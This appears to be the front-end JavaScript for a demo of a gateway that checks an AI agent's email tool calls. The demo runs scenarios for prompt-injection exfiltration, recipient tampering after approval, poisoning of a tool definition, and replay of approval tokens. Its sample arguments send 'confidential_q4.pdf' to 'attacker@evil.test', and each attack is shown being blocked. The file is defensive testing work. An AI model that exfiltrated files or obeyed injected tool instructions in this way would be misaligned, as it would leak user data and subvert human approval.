// ─── Constants & scenario definitions ────────────────────────────────────────
const API = '/v1';
const scenarios = {
  safe: {
    server_id: 'mock-email-v1', tool_name: 'send_email',
    arguments: { to: 'alice@company.test', subject: 'Q4 report', body: 'Please review the attached report.', attachment: 'meeting_notes.pdf' }
  },
  exfil: {
    server_id: 'mock-email-v1', tool_name: 'send_email',
    arguments: { to: 'attacker@evil.test', subject: 'Q4 report', body: 'Please review the attached report.', attachment: 'confidential_q4.pdf' }
  },
  tamper: {
    server_id: 'mock-email-v1', tool_name: 'send_email',
    arguments: { to: 'alice@partner.test', subject: 'Meeting notes', body: 'Please review the attached meeting notes.', attachment: 'meeting_notes.pdf' }
  },
  registry: null,  // handled entirely by its own panel buttons
  replay: null,    // handled entirely by its own panel button
};

// ─── State ────────────────────────────────────────────────────────────────────
let active = null;
let approvalToken = null;

// ─── Helpers ─────────────────────────────────────────────────────────────────
const $ = s => document.querySelector(s);

async function request(path, options = {}) {
  const r = await fetch(API + path, { headers: { 'Content-Type': 'application/json' }, ...options });
  const data = await r.json();
  if (!r.ok) throw { status: r.status, detail: data.detail };
  return data;
}

function setState(kind, text, explanation) {
  const e = $('#state');
  e.className = 'state ' + kind;
  e.querySelector('span').textContent = text;
  $('#explanation').textContent = explanation;
}

function steps(marked, blocked = false) {
  [...$('#steps').children].forEach((x, i) =>
    x.className = i < marked ? 'done' : (blocked && i === marked ? 'blocked' : '')
  );
}

function short(f) { return f ? f.slice(0, 13) + '…' + f.slice(-6) : ''; }

function showReview(tx) {
  $('#review-empty').hidden = true;
  $('#review').hidden = false;
  $('#review-to').textContent = tx.approval_request.arguments.to;
  $('#review-subject').textContent = tx.approval_request.arguments.subject;
  $('#review-attachment').textContent = tx.approval_request.arguments.attachment;
  $('#review-fingerprint').textContent = short(tx.fingerprint);
}

function clearReview() {
  $('#review-empty').hidden = false;
  $('#review').hidden = true;
}

function resetApproveButton() {
  const btn = $('#approve');
  btn.textContent = 'Approve exact action';
  btn.onclick = approve;
  btn.disabled = false;
  $('#reject').disabled = false;
}

async function refreshMailbox() {
  try {
    const x = await request('/mailbox/sent');
    $('#mail-count').textContent = `${x.messages.length} message${x.messages.length === 1 ? '' : 's'}`;
    $('#mailbox').innerHTML = x.messages.length
      ? x.messages.map(m => `<div class="mail"><b>To: ${m.to}</b>${m.subject} · ${m.attachment}</div>`).join('')
      : 'No simulated messages sent yet.';
    return x.messages.length;
  } catch {
    $('#mailbox').textContent = 'Start the simulated Email MCP server to view the mailbox.';
    return 0;
  }
}

async function loadAudit() {
  if (!active) return;
  const x = await request(`/transactions/${active.id}/audit`);
  $('#audit').innerHTML = x.events.map(e =>
    `<li><b>${e.event_type}</b><span>${e.message}</span></li>`
  ).join('');
}

function hideAllExtraPanels() {
  $('#injection-panel').hidden = true;
  $('#registry-panel').hidden = true;
  $('#replay-panel').hidden = true;
  $('#diff-panel').hidden = true;
}

// ─── Standard scenario runner (01, 02, 03) ───────────────────────────────────
async function run(which) {
  hideAllExtraPanels();
  clearReview();
  resetApproveButton();
  approvalToken = null;
  const invocation = scenarios[which];
  setState('neutral', 'Proposing action…', 'The agent request is being checked before the simulated tool can receive it.');
  steps(1);

  // Show prompt injection narrative for exfil scenario before proposing
  if (which === 'exfil') {
    $('#injection-panel').hidden = false;
    $('#inj-verdict').textContent = 'Evaluating…';
    $('#inj-verdict').className = 'inj-verdict';
    $('#inj-result-label').className = 'inj-label';
  }

  try {
    const tx = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
    active = { id: tx.transaction_id, invocation, scenario: which, tx };
    await loadAudit();

    if (tx.decision === 'ALLOW') {
      setState('safe', 'Policy allowed exact action', 'Internal, non-sensitive communication is permitted. Executing the exact proposed request.');
      steps(2);
      await request(`/transactions/${active.id}/execute`, { method: 'POST', body: JSON.stringify({ invocation }) });
      setState('safe', 'Verified and executed', 'The gateway checked the exact action and the simulated email server accepted it.');
      steps(4);
      await loadAudit();
      await refreshMailbox();

    } else if (tx.decision === 'DENY') {
      setState('danger', 'Blocked before execution', 'The protected attachment may not leave the approved domain. No email was sent.');
      steps(2, true);
      await refreshMailbox();

      if (which === 'exfil') {
        $('#inj-verdict').textContent = 'DENIED — P-DENY-001: Protected attachment may not leave approved domain. The injected instruction was never executed.';
        $('#inj-verdict').className = 'inj-verdict blocked-verdict';
        $('#inj-result-label').className = 'inj-label blocked-label';
      }

    } else {
      // REQUIRE_APPROVAL
      setState('approval', 'Awaiting your exact approval', 'External communication can proceed only if you approve these immutable details.');
      steps(2);
      showReview(tx);
    }
  } catch (e) {
    setState('danger', 'Service unavailable', e.detail?.message || 'Start both local services and try again.');
  }
}

// ─── Approval flow ────────────────────────────────────────────────────────────
async function approve() {
  if (!active) return;
  try {
    const x = await request(`/transactions/${active.id}/approve`, { method: 'POST' });
    approvalToken = x.token;
    setState('approval', 'Approved once', 'The approval is bound to this fingerprint and expires at ' + new Date(x.expires_at).toLocaleTimeString() + '.');
    steps(3);
    await loadAudit();

    if (active.scenario === 'tamper') {
      $('#approve').textContent = 'Attempt altered execution';
      $('#approve').onclick = attemptTamper;
    }
  } catch (e) {
    setState('danger', 'Approval failed', e.detail?.message || 'Could not approve this action.');
  }
}

async function attemptTamper() {
  const altered = structuredClone(active.invocation);
  altered.arguments.to = 'attacker@evil.test';
  try {
    await request(`/transactions/${active.id}/execute`, { method: 'POST', body: JSON.stringify({ invocation: altered, approval_token: approvalToken }) });
  } catch (e) {
    const count = await refreshMailbox();
    setState('danger', 'Blocked — approval mismatch', 'The attempted recipient differs from the recipient you approved. Nothing reached the email server.');
    steps(3, true);
    $('#approved-to').textContent = active.invocation.arguments.to;
    $('#attempted-to').textContent = altered.arguments.to;
    $('#unauthorized').textContent = count;
    $('#diff-panel').hidden = false;
    await loadAudit();
    $('#approve').disabled = true;
    $('#reject').disabled = true;
  }
}

// ─── Reset ────────────────────────────────────────────────────────────────────
async function reset() {
  try { await request('/demo/reset', { method: 'POST' }); } catch { }
  active = null;
  approvalToken = null;
  clearReview();
  hideAllExtraPanels();
  resetApproveButton();
  setState('neutral', 'Ready for a controlled scenario', 'The agent can propose an action. ActionProof independently decides whether it can execute.');
  steps(0);
  $('#audit').innerHTML = '<li><b>STANDBY</b><span>Nothing has executed.</span></li>';
  await refreshMailbox();
  // Reset registry panel state too
  await loadRegistryStatus();
}

// ─── Scenario 04: Tool definition registry ───────────────────────────────────
async function loadRegistryStatus() {
  try {
    const s = await request('/registry/status');
    $('#reg-approved-hash').textContent = s.approved_hash.slice(0, 32) + '…';
    $('#reg-current-hash').textContent = s.current_hash.slice(0, 32) + '…';
    $('#reg-approved-desc').textContent = '"Send a message through the simulated email service."';

    if (s.tampered) {
      $('#reg-current-box').className = 'reg-box current tampered';
      $('#reg-current-desc').textContent = `"${s.current_description}"`;
      $('#reg-verdict').textContent = '⚠ REGISTRY DRIFT DETECTED — the pinned hash no longer matches the approved definition. All tool calls will be blocked until re-approved.';
      $('#reg-verdict').className = 'reg-verdict danger-verdict';
      $('#btn-tamper').disabled = true;
      $('#btn-restore').disabled = false;
      $('#btn-propose-after-tamper').disabled = false;
    } else {
      $('#reg-current-box').className = 'reg-box current';
      $('#reg-current-desc').textContent = '"Send a message through the simulated email service."';
      $('#reg-verdict').textContent = '✓ Registry intact — current definition matches the approved pinned hash.';
      $('#reg-verdict').className = 'reg-verdict safe-verdict';
      $('#btn-tamper').disabled = false;
      $('#btn-restore').disabled = true;
      $('#btn-propose-after-tamper').disabled = true;
    }
  } catch {
    $('#reg-verdict').textContent = 'Could not load registry status. Is the gateway running?';
  }
}

function showRegistryScenario() {
  hideAllExtraPanels();
  clearReview();
  resetApproveButton();
  active = null;
  approvalToken = null;
  setState('neutral', 'Tool Registry Integrity Check', 'Scenario 04 uses the registry panel below. Tamper the definition, then attempt to use the tool.');
  steps(0);
  $('#audit').innerHTML = '<li><b>STANDBY</b><span>No transaction yet.</span></li>';
  $('#registry-panel').hidden = false;
  loadRegistryStatus();
  refreshMailbox();
}

$('#btn-tamper') && ($('#btn-tamper').onclick = async () => {
  await request('/registry/tamper', { method: 'POST' });
  await loadRegistryStatus();
  setState('danger', 'Tool definition poisoned', 'An attacker has modified the downstream tool description to inject malicious instructions. ActionProof detects the hash mismatch.');
});

$('#btn-restore') && ($('#btn-restore').onclick = async () => {
  await request('/registry/restore', { method: 'POST' });
  await loadRegistryStatus();
  setState('neutral', 'Definition restored', 'The tool definition is back to its approved version. The registry is clean.');
});

$('#btn-propose-after-tamper') && ($('#btn-propose-after-tamper').onclick = async () => {
  const invocation = scenarios.tamper;
  setState('neutral', 'Proposing action with drifted registry…', 'Attempting to use a tool whose definition has changed since it was pinned.');
  steps(1);
  try {
    const tx = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
    // Should not reach here if drift is detected
    active = { id: tx.transaction_id, invocation, scenario: 'registry', tx };
    await loadAudit();
    setState('approval', 'Unexpected: proposal accepted', 'The drift check may not have triggered. Check registry status.');
  } catch (e) {
    const code = e.detail?.code || 'ERROR';
    const msg = e.detail?.message || 'Unknown error';
    if (code === 'REGISTRY_DRIFT') {
      setState('danger', 'Blocked — registry drift', msg);
      steps(1, true);
      $('#audit').innerHTML = `<li><b>REGISTRY_DRIFT</b><span>${msg}</span></li>`;
    } else {
      setState('danger', 'Blocked', msg);
      steps(1, true);
    }
    await refreshMailbox();
  }
});

// ─── Scenario 05: Token replay ────────────────────────────────────────────────
function showReplayScenario() {
  hideAllExtraPanels();
  clearReview();
  resetApproveButton();
  active = null;
  approvalToken = null;
  setState('neutral', 'Token Replay Protection', 'Scenario 05 runs automatically. Watch the approval token be consumed on first use, then blocked on second.');
  steps(0);
  $('#audit').innerHTML = '<li><b>STANDBY</b><span>No transaction yet.</span></li>';
  $('#replay-panel').hidden = false;
  // Reset step indicators
  ['rpl-s1', 'rpl-s2', 'rpl-s3', 'rpl-s4'].forEach(id => { $(('#' + id)).textContent = '—'; $(('#' + id)).className = 'rpl-status'; });
  $('#replay-result').hidden = true;
  $('#btn-replay-run').disabled = false;
  refreshMailbox();
}

$('#btn-replay-run') && ($('#btn-replay-run').onclick = runReplaySequence);

async function runReplaySequence() {
  $('#btn-replay-run').disabled = true;
  const invocation = scenarios.tamper; // partner email — requires approval

  function rplStatus(id, text, kind) {
    const el = $('#' + id);
    el.textContent = text;
    el.className = 'rpl-status rpl-' + kind;
  }

  // Step 1: Propose
  rplStatus('rpl-s1', 'Running…', 'running');
  setState('neutral', 'Step 1 — Proposing action…', 'The agent proposes an email that requires user approval.');
  steps(1);
  let tx;
  try {
    tx = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
    active = { id: tx.transaction_id, invocation, scenario: 'replay', tx };
    rplStatus('rpl-s1', '✓ AWAITING_APPROVAL', 'ok');
    await loadAudit();
  } catch (e) {
    rplStatus('rpl-s1', '✗ Failed', 'fail');
    setState('danger', 'Propose failed', e.detail?.message || 'Could not propose transaction.');
    return;
  }

  // Step 2: Approve
  rplStatus('rpl-s2', 'Running…', 'running');
  setState('approval', 'Step 2 — Issuing approval token…', 'A one-use HMAC token is issued and bound to this exact fingerprint.');
  steps(3);
  let token;
  try {
    const ap = await request(`/transactions/${tx.transaction_id}/approve`, { method: 'POST' });
    token = ap.token;
    rplStatus('rpl-s2', '✓ Token issued', 'ok');
    await loadAudit();
  } catch (e) {
    rplStatus('rpl-s2', '✗ Failed', 'fail');
    setState('danger', 'Approve failed', e.detail?.message || 'Could not approve transaction.');
    return;
  }

  // Step 3: First execution (should succeed)
  rplStatus('rpl-s3', 'Running…', 'running');
  setState('safe', 'Step 3 — First execution…', 'Using the token for the first time. This should succeed.');
  try {
    await request(`/transactions/${tx.transaction_id}/execute`, { method: 'POST', body: JSON.stringify({ invocation, approval_token: token }) });
    rplStatus('rpl-s3', '✓ EXECUTED', 'ok');
    await loadAudit();
    await refreshMailbox();
  } catch (e) {
    rplStatus('rpl-s3', '✗ Failed', 'fail');
    setState('danger', 'First execution failed', e.detail?.message || 'Unexpected failure on first use.');
    return;
  }

  // Step 4: Replay attempt (must be blocked)
  rplStatus('rpl-s4', 'Running…', 'running');
  setState('approval', 'Step 4 — Replaying the same token…', 'The agent tries to reuse the already-consumed token.');

  // We need a fresh transaction to replay against (the first is EXECUTED/terminal)
  // Create a second transaction and try to use the first token against it
  let tx2;
  try {
    tx2 = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
    await request(`/transactions/${tx2.transaction_id}/approve`, { method: 'POST' });
    // Now attempt to execute tx2 with the OLD token from tx (wrong transaction)
    await request(`/transactions/${tx2.transaction_id}/execute`, { method: 'POST', body: JSON.stringify({ invocation, approval_token: token }) });
    // If we reach here, replay was not blocked
    rplStatus('rpl-s4', '✗ NOT BLOCKED', 'fail');
    setState('danger', 'Replay was not blocked', 'The gateway accepted a reused token. This is a failure.');
  } catch (e) {
    const code = e.detail?.code || '';
    if (code === 'WRONG_TRANSACTION' || code === 'TOKEN_REPLAY' || code === 'INVALID_TOKEN') {
      rplStatus('rpl-s4', '✓ BLOCKED — ' + code, 'ok');
      setState('danger', 'Replay blocked — ' + code, 'The token was already consumed or belongs to a different transaction. Zero additional emails delivered.');
      steps(3, true);
      await loadAudit();
      const count = await refreshMailbox();
      const result = $('#replay-result');
      result.hidden = false;
      result.className = 'replay-result success-result';
      result.innerHTML = `<b>✓ Single-use enforcement confirmed.</b> Token from transaction <code>${tx.transaction_id.slice(-8)}</code> was rejected on second use (code: <code>${code}</code>). Total emails in mailbox: <b>${count}</b> (only the legitimate first use).`;
    } else {
      rplStatus('rpl-s4', '✗ ' + (e.detail?.message || 'Error'), 'fail');
      setState('danger', 'Unexpected error', e.detail?.message || 'Unknown failure.');
    }
  }
}

// ─── Wire up scenario buttons ─────────────────────────────────────────────────
document.querySelectorAll('.scenario').forEach(b => {
  b.onclick = () => {
    const which = b.dataset.scenario;
    if (which === 'registry') {
      showRegistryScenario();
    } else if (which === 'replay') {
      showReplayScenario();
    } else {
      run(which);
    }
  };
});

$('#approve').onclick = approve;
$('#reject').onclick = async () => {
  if (active) {
    await request(`/transactions/${active.id}/reject`, { method: 'POST' });
    setState('danger', 'Rejected', 'The user rejected the proposed transaction.');
    steps(2, true);
    await loadAudit();
  }
};
$('#reset').onclick = reset;

// ─── Init ─────────────────────────────────────────────────────────────────────
refreshMailbox();
